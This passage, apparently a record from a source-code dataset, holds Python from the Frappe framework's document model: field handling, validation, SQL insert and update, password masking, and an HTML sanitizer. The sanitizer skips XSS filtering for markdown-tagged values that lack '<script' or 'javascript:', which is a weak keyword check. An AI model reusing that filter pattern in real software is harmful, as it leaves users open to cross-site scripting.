sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn out ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in 